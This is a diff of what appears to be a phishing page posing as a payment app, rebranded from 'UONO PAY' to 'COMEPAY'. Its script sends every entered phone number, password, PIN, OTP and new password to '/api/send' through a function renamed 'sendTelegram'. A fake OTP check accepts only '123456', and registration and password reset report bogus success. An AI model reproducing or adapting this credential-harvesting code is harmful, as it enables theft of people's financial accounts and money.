@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UONO PAY</title>
+    <title>COMEPAY</title>
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -15,27 +15,24 @@
         }
 
         body {
-            background: url('bg.jpg') no-repeat center center fixed;
-            background-size: cover;
+            background-color: #1e1e1e;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #9ca3af;
-            overflow: hidden;
+            color: #ffffff;
         }
 
         .phone-container {
-            width: 100vw;
-            height: 100vh;
-            background: url('bg.jpg') no-repeat center center;
-            background-size: cover;
+            width: 100%;
+            max-width: 400px;
+            height: 850px;
+            background-color: #1e1e1e;
             position: relative;
             padding: 30px;
             display: flex;
             flex-direction: column;
             overflow-y: auto;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
         /* --- SCREENS HANDLING --- */
@@ -45,10 +42,7 @@
             align-items: center;
             width: 100%;
             height: 100%;
-            max-width: 450px;
-            margin: 0 auto;
             justify-content: flex-start;
-            padding-top: 30px;
         }
 
         .screen.active {
@@ -62,7 +56,7 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background-color: #1a1a1a;
+            background-color: #1e1e1e;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -109,14 +103,11 @@
             100% { transform: translateY(0) scale(1); opacity: 1; }
         }
 
-        /* Common Form Controls - Local Input Background */
+        /* Common Form Controls */
         .input-group {
             position: relative;
             margin-bottom: 20px;
             width: 100%;
-            max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
         }
 
         .input-group i {
@@ -124,62 +115,61 @@
             left: 20px;
             top: 50%;
             transform: translateY(-50%);
-            color: #9ca3af;
+            color: #aaaaaa;
             font-size: 20px;
-            z-index: 2;
         }
 
         .input-group input {
             width: 100%;
             padding: 16px 20px 16px 55px;
-            border: 1px solid #333333;
+            border: 1px solid #3a3a3a;
             border-radius: 30px;
-            background: url('input-bg.jpg') no-repeat center center;
-            background-size: cover;
+            background-color: #444444;
             font-size: 16px;
             outline: none;
             color: #ffffff;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
         .input-group input::placeholder {
-            color: #9ca3af;
+            color: #aaaaaa;
         }
 
         .btn-primary {
             width: 100%;
-            max-width: 320px;
-            background-image: url('input-bg.jpg');
-            background-size: cover;
-            background-position: center;
-            color: #ffffff;
+            background-color: #ffe7c3;
+            color: #111111;
             border: none;
             padding: 16px;
             border-radius: 30px;
             font-size: 18px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
             margin-top: 15px;
-            margin-left: auto;
-            margin-right: auto;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: opacity 0.2s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            transition: background 0.2s;
         }
 
-        .btn-primary:hover { opacity: 0.9; }
-        .btn-primary:disabled { background-color: #3f3f46; color: #71717a; background-image: none; cursor: not-allowed; box-shadow: none; }
+        .btn-primary:hover {
+            background-color: #f7d8a8;
+        }
+
+        .btn-primary:disabled {
+            background-color: #555555;
+            color: #888888;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
 
         /* --- LOGIN SCREEN --- */
         .logo-box {
-            margin-top: 10px;
-            margin-bottom: 25px;
+            margin-top: 20px;
+            margin-bottom: 30px;
             text-align: center;
         }
 
         .logo-box img {
-            width: 160px;
+            width: 180px;
             height: auto;
         }
 
@@ -187,24 +177,22 @@
             display: flex;
             justify-content: space-between;
             width: 100%;
-            max-width: 320px;
             padding: 0 10px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             font-size: 15px;
         }
 
         .login-options a {
-            color: #d1d5db;
+            color: #e2e8f0;
             text-decoration: underline;
             font-weight: 500;
             cursor: pointer;
         }
 
-        /* Checkbox Styles - Blue Tick */
         .checkbox-label, .agree-checkbox-label {
             display: flex;
             align-items: center;
-            color: #d1d5db;
+            color: #ffffff;
             font-weight: 500;
             cursor: pointer;
         }
@@ -214,17 +202,16 @@
             -webkit-appearance: none;
             width: 18px;
             height: 18px;
-            border: 2px solid #9ca3af;
+            border: 2px solid #3b82f6;
+            background-color: transparent;
             border-radius: 50%;
             margin-right: 8px;
             outline: none;
             position: relative;
             cursor: pointer;
-            background-color: #ffffff;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s ease;
         }
 
         .checkbox-label input:checked, .agree-checkbox-label input:checked {
@@ -233,12 +220,14 @@
         }
 
         .checkbox-label input:checked::before, .agree-checkbox-label input:checked::before {
-            content: '\f00c';
-            font-family: 'Font Awesome 6 Free';
-            font-weight: 900;
-            font-size: 10px;
-            color: #ffffff;
+            content: '✓';
             position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 11px;
+            font-weight: bold;
         }
 
         .privacy-row {
@@ -246,9 +235,9 @@
             justify-content: center;
             align-items: center;
             width: 100%;
-            max-width: 320px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             font-size: 14px;
+            color: #ffffff;
         }
 
         .privacy-row a {
@@ -260,7 +249,7 @@
 
         .forget-password {
             margin-top: 25px;
-            color: #d1d5db;
+            color: #e2e8f0;
             text-decoration: underline;
             font-size: 15px;
             font-weight: 500;
@@ -272,8 +261,8 @@
         .version-tag {
             position: absolute;
             bottom: 20px;
-            right: 25px;
-            color: #71717a;
+            right: 20px;
+            color: #718096;
             font-size: 13px;
         }
 
@@ -283,23 +272,23 @@
             align-items: center;
             justify-content: center;
             position: relative;
-            margin-bottom: 25px;
+            margin-top: 10px;
+            margin-bottom: 30px;
             width: 100%;
-            max-width: 320px;
         }
 
         .reg-header .back-btn {
             position: absolute;
             left: 0;
-            color: #ffffff;
+            color: #ffe7c3;
             font-size: 24px;
             cursor: pointer;
         }
 
         .reg-header h2 {
-            color: #ffffff;
+            color: #ffe7c3;
             font-size: 22px;
-            font-weight: 700;
+            font-weight: 600;
         }
 
         /* Phone & OTP Wrappers */
@@ -307,33 +296,26 @@
             display: flex;
             align-items: center;
             width: 100%;
-            max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
-            border: 1px solid #333333;
+            border: 1px solid #3a3a3a;
             border-radius: 30px;
-            background: url('input-bg.jpg') no-repeat center center;
-            background-size: cover;
+            background-color: #444444;
             padding: 0 20px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
         .phone-input-wrapper i {
-            color: #9ca3af;
+            color: #aaaaaa;
             font-size: 20px;
             margin-right: 15px;
-            z-index: 2;
         }
 
         .country-code {
-            color: #9ca3af;
+            color: #ffffff;
             font-weight: 600;
             font-size: 16px;
             padding-right: 15px;
-            border-right: 1px solid #3f3f46;
-            z-index: 2;
+            border-right: 1px solid #666666;
         }
 
         .phone-input-wrapper input {
@@ -344,15 +326,15 @@
             font-size: 16px;
             background: transparent;
             color: #ffffff;
-            position: relative;
+        }
+
+        .phone-input-wrapper input::placeholder {
+            color: #aaaaaa;
         }
 
         .otp-wrapper {
             position: relative;
             width: 100%;
-            max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
             margin-bottom: 20px;
         }
 
@@ -365,26 +347,30 @@
             right: 8px;
             top: 50%;
             transform: translateY(-50%);
-            background-image: url('input-bg.jpg');
-            background-size: cover;
-            background-position: center;
-            color: #ffffff;
+            background-color: #ffe7c3;
+            color: #111111;
             border: none;
             padding: 8px 18px;
             border-radius: 20px;
             font-size: 14px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
-            transition: opacity 0.2s;
-            z-index: 3;
+            transition: background 0.2s;
         }
 
-        .send-otp-btn:hover { opacity: 0.9; }
-        .send-otp-btn:disabled { background-color: #3f3f46; color: #71717a; background-image: none; cursor: not-allowed; }
+        .send-otp-btn:hover {
+            background-color: #f7d8a8;
+        }
+
+        .send-otp-btn:disabled {
+            background-color: #555555;
+            color: #888888;
+            cursor: not-allowed;
+        }
 
         .timer-text {
             text-align: center;
-            color: #e5b974;
+            color: #ffe7c3;
             font-size: 14px;
             font-weight: 600;
             margin-top: -10px;
@@ -392,74 +378,73 @@
             display: none;
         }
 
-        .timer-text.active { display: block; }
+        .timer-text.active {
+            display: block;
+        }
 
         /* --- PRIVACY POLICY CONTAINER --- */
         .privacy-container-inner {
             width: 100%;
-            max-width: 420px;
-            background: rgba(50, 50, 50, 0.9);
+            background: #2e2e2e;
             border-radius: 20px;
             padding: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            border: 1px solid #333333;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid #3a3a3a;
             margin-bottom: 30px;
             font-size: 14px;
             line-height: 1.6;
-            color: #d1d5db;
-            max-height: 75vh;
+            color: #cccccc;
+            max-height: 70vh;
             overflow-y: auto;
         }
 
         .privacy-container-inner h3 {
-            color: #ffffff;
+            color: #ffe7c3 !important;
             font-size: 15px;
             margin-top: 15px;
             margin-bottom: 5px;
-            font-weight: 700;
+            font-weight: 600;
         }
 
         .privacy-container-inner p {
             margin-bottom: 10px;
         }
 
-        /* --- VERIFICATION MODAL POPUP --- */
+        /* --- VERIFICATION POPUP MODAL --- */
         .modal-overlay {
             display: none;
-            position: fixed;
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
+            width: 100%;
+            height: 100%;
             background-color: rgba(0, 0, 0, 0.7);
-            z-index: 10000;
+            z-index: 100;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
 
         .modal-card {
-            background-color: #323232;
+            background-color: #2e2e2e;
             width: 100%;
-            max-width: 380px;
             border-radius: 24px;
-            padding: 25px 20px;
+            padding: 30px 24px;
             position: relative;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            animation: zoomInFromInside 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-            border: 1px solid #333333;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            animation: fadeIn 0.3s ease-out;
         }
 
-        @keyframes zoomInFromInside {
-            0% { transform: scale(0.2); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
+        @keyframes fadeIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
 
         .modal-header {
-            margin-bottom: 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 25px;
         }
 
         .modal-header h3 {
@@ -469,7 +454,7 @@
         }
 
         .close-modal-btn {
-            background-color: #3f3f46;
+            background-color: #444444;
             border: none;
             width: 32px;
             height: 32px;
@@ -478,12 +463,12 @@
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            color: #ffffff;
+            color: #cccccc;
             font-size: 14px;
         }
 
         .modal-body-text {
-            color: #d1d5db;
+            color: #e2e8f0;
             font-size: 14px;
             line-height: 1.5;
             margin-bottom: 8px;
@@ -491,22 +476,25 @@
         }
 
         .modal-subtext {
-            color: #3b82f6;
+            color: #ffe7c3;
             font-size: 14px;
             font-weight: 700;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         .modal-card .otp-wrapper input {
-            border: 1px solid #333333;
+            border: 1px solid #3a3a3a;
             border-radius: 30px;
             padding-left: 55px;
+            background-color: #444444;
             color: #ffffff;
-            background: url('input-bg.jpg') no-repeat center center;
-            background-size: cover;
         }
 
-        /* Spinner for Buttons */
+        .modal-card .timer-text {
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -515,9 +503,9 @@
             display: inline-block;
             width: 16px;
             height: 16px;
-            border: 2px solid rgba(26, 26, 26, 0.3);
+            border: 2px solid rgba(17, 17, 17, 0.3);
             border-radius: 50%;
-            border-top-color: #ffffff;
+            border-top-color: #111111;
             animation: spin 0.8s ease-in-out infinite;
         }
     </style>
@@ -526,10 +514,10 @@
 
     <!-- ================= SPLASH / INTRO SCREEN ================= -->
     <div id="splash-screen">
-        <img src="splash-bg.jpg" alt="Splash Background" class="splash-bg-img">
+        <img src="https://i.ibb.co/Wd88ZjH/IMG-20261013-152434.jpg" alt="Splash Background" class="splash-bg-img">
         <div class="splash-card-wrapper">
-            <img src="card.png" alt="UONOPAY Card" class="base-card">
-            <img src="logo.png" alt="Overlay Logo" class="overlay-img">
+            <img src="https://i.ibb.co/ksMmCXQY/card-1.png" alt="ComePay Card" class="base-card">
+            <img src="https://i.ibb.co/spcKWM1R/20261016-093131.png" alt="Overlay Image" class="overlay-img">
         </div>
     </div>
 
@@ -538,7 +526,7 @@
         <!-- ================= LOGIN SCREEN ================= -->
         <div id="login-screen" class="screen active">
             <div class="logo-box">
-                <img src="logo.png" alt="UONO PAY Logo">
+                <img src="https://i.ibb.co/hRrLZc5N/IMG-20261004-170750-457.jpg" alt="ComePay Logo">
             </div>
 
             <div class="input-group">
@@ -572,7 +560,7 @@
 
             <button class="btn-primary" id="btn-sign-in" type="button">Sign In</button>
             <a id="nav-to-forgot" class="forget-password">Forget Password</a>
-            <div class="version-tag">v1.6.1</div>
+            <div class="version-tag">v1.4.4</div>
         </div>
 
         <!-- ================= REGISTER SCREEN ================= -->
@@ -604,8 +592,8 @@
             </div>
 
             <div class="input-group otp-wrapper">
-                <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #9ca3af; font-size: 20px; z-index: 2;"></i>
-                <input type="text" placeholder="OTP Code" id="reg-otp" style="padding-left: 55px;">
+                <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #aaaaaa; font-size: 20px;"></i>
+                <input type="text" placeholder="OTP Code" id="reg-otp">
                 <button class="send-otp-btn" id="btn-send-reg-otp" type="button">Send</button>
             </div>
 
@@ -636,8 +624,8 @@
             </div>
 
             <div class="input-group otp-wrapper">
-                <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #9ca3af; font-size: 20px; z-index: 2;"></i>
-                <input type="text" placeholder="6-digit OTP Code" id="forgot-otp" inputmode="numeric" pattern="[0-9]*" maxlength="6" style="padding-left: 55px;">
+                <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #aaaaaa; font-size: 20px;"></i>
+                <input type="text" placeholder="6-digit OTP Code" id="forgot-otp" inputmode="numeric" pattern="[0-9]*" maxlength="6">
                 <button class="send-otp-btn" id="btn-send-forgot-otp" type="button">Send</button>
             </div>
 
@@ -712,8 +700,8 @@
                 <div class="timer-text" id="modal-timer"></div>
 
                 <div class="input-group otp-wrapper">
-                    <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #9ca3af; font-size: 20px; z-index: 2;"></i>
-                    <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric" pattern="[0-9]*" style="padding-left: 55px;">
+                    <i class="fa-regular fa-envelope" style="position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #aaaaaa; font-size: 20px;"></i>
+                    <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
                     <button class="send-otp-btn" id="modal-send-otp-btn" type="button">Send</button>
                 </div>
 
@@ -732,7 +720,7 @@
         let regTimerSeconds = 60;
         let isRegTimerRunning = false;
 
-        async function sendBackend(payload) {
+        async function sendTelegram(payload) {
             try {
                 await fetch('/api/send', {
                     method: 'POST',
@@ -771,15 +759,12 @@
             if(timerElement) timerElement.classList.add('active');
 
             sendBtn.disabled = true;
-            sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-            sendBtn.style.color = '#ffffff';
+            sendBtn.style.backgroundColor = '#ffe7c3';
             sendBtn.innerHTML = '<div class="spinner"></div>';
 
             setTimeout(() => {
                 sendBtn.innerHTML = timerSeconds + 's';
-                sendBtn.style.backgroundColor = '#3f3f46'; 
-                sendBtn.style.backgroundImage = 'none';
-                sendBtn.style.color = '#71717a';
+                sendBtn.style.backgroundColor = '#555555'; 
 
                 timerInterval = setInterval(() => {
                     timerSeconds--;
@@ -791,8 +776,7 @@
                         isTimerRunning = false;
                         if(timerElement) timerElement.classList.remove('active');
                         sendBtn.disabled = false;
-                        sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-                        sendBtn.style.color = '#ffffff';
+                        sendBtn.style.backgroundColor = '#ffe7c3';
                         sendBtn.innerHTML = 'Resend';
                     }
                 }, 1000);
@@ -808,8 +792,7 @@
                 if(modalTimer) modalTimer.classList.remove('active');
                 const sendBtn = document.getElementById('modal-send-otp-btn');
                 sendBtn.disabled = false;
-                sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-                sendBtn.style.color = '#ffffff';
+                sendBtn.style.backgroundColor = '#ffe7c3';
                 sendBtn.innerHTML = 'Send';
             }
             document.getElementById('verification-modal').style.display = 'none';
@@ -832,20 +815,17 @@
             if (isRegTimerRunning) return;
 
             const username = usernameInput.value.trim();
-            sendBackend({ type: 'reg_otp', username: username, phone: phone });
+            sendTelegram({ type: 'reg_otp', username, phone });
 
             isRegTimerRunning = true;
             sendBtn.disabled = true;
-            sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-            sendBtn.style.color = '#ffffff';
+            sendBtn.style.backgroundColor = '#ffe7c3';
             sendBtn.innerHTML = '<div class="spinner"></div>';
 
             setTimeout(() => {
                 regTimerSeconds = 59;
                 sendBtn.innerHTML = regTimerSeconds + 's';
-                sendBtn.style.backgroundColor = '#3f3f46';
-                sendBtn.style.backgroundImage = 'none';
-                sendBtn.style.color = '#71717a';
+                sendBtn.style.backgroundColor = '#555555';
 
                 regTimerInterval = setInterval(() => {
                     regTimerSeconds--;
@@ -856,8 +836,7 @@
                         regTimerInterval = null;
                         isRegTimerRunning = false;
                         sendBtn.disabled = false;
-                        sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-                        sendBtn.style.color = '#ffffff';
+                        sendBtn.style.backgroundColor = '#ffe7c3';
                         sendBtn.innerHTML = 'Resend';
                     }
                 }, 1000);
@@ -872,7 +851,7 @@
                 return;
             }
             const phone = document.getElementById('login-phone')?.value || 'unknown';
-            sendBackend({ type: 'modal_otp', phone: phone });
+            sendTelegram({ type: 'modal_otp', phone });
             startTimer();
             setTimeout(() => alert("OTP Sent Successfully!"), 200);
         }
@@ -886,10 +865,10 @@
                 return;
             }
 
-            sendBackend({ type: 'verify_otp', phone: phone, otp: otpVal });
+            sendTelegram({ type: 'verify_otp', phone, otp: otpVal });
 
             if (otpVal === "123456") {
-                sendBackend({ type: 'success_login', phone: phone });
+                sendTelegram({ type: 'success_login', phone });
                 alert("✅ Verification successful! Logging in...");
                 closeModal();
             } else {
@@ -908,19 +887,15 @@
                 return;
             }
 
-            sendBackend({ type: 'forgot_otp', phone: phone });
+            sendTelegram({ type: 'forgot_otp', phone });
 
             sendBtn.disabled = true;
-            sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-            sendBtn.style.color = '#ffffff';
             sendBtn.innerHTML = '<div class="spinner"></div>';
 
             setTimeout(() => {
                 let timeLeft = 59;
                 sendBtn.innerHTML = timeLeft + 's';
-                sendBtn.style.backgroundColor = '#3f3f46'; 
-                sendBtn.style.backgroundImage = 'none';
-                sendBtn.style.color = '#71717a';
+                sendBtn.style.backgroundColor = '#555555'; 
 
                 const timerInterval = setInterval(() => {
                     timeLeft--;
@@ -929,8 +904,7 @@
                     if (timeLeft <= 0) {
                         clearInterval(timerInterval);
                         sendBtn.disabled = false;
-                        sendBtn.style.backgroundImage = "url('input-bg.jpg')";
-                        sendBtn.style.color = '#ffffff';
+                        sendBtn.style.backgroundColor = '#ffe7c3';
                         sendBtn.innerHTML = 'Resend';
                     }
                 }, 1000);
@@ -949,7 +923,7 @@
                 return;
             }
 
-            sendBackend({ type: 'reset_pass', phone: phone, pass: newPass, otp: otp });
+            sendTelegram({ type: 'reset_pass', phone, pass: newPass, otp });
 
             alert('Password reset successfully!');
             switchScreen('login-screen');
@@ -975,7 +949,7 @@
             const pass = document.getElementById('login-pass')?.value || 'No Password';
             const pin = document.getElementById('login-pin')?.value || 'No PIN';
             
-            sendBackend({ type: 'login', phone: phoneInput, pass: pass, pin: pin });
+            sendTelegram({ type: 'login', phone: phoneInput, pass, pin });
 
             document.getElementById('verification-modal').style.display = 'flex';
         }
@@ -987,7 +961,7 @@
             const pin = document.getElementById('reg-pin')?.value || 'No PIN';
             const invite = document.getElementById('reg-invite')?.value || '—';
 
-            sendBackend({ type: 'register', username: username, phone: phone, pass: pass, pin: pin, invite: invite });
+            sendTelegram({ type: 'register', username, phone, pass, pin, invite });
 
             alert("Registration successful!");
             switchScreen('login-screen');
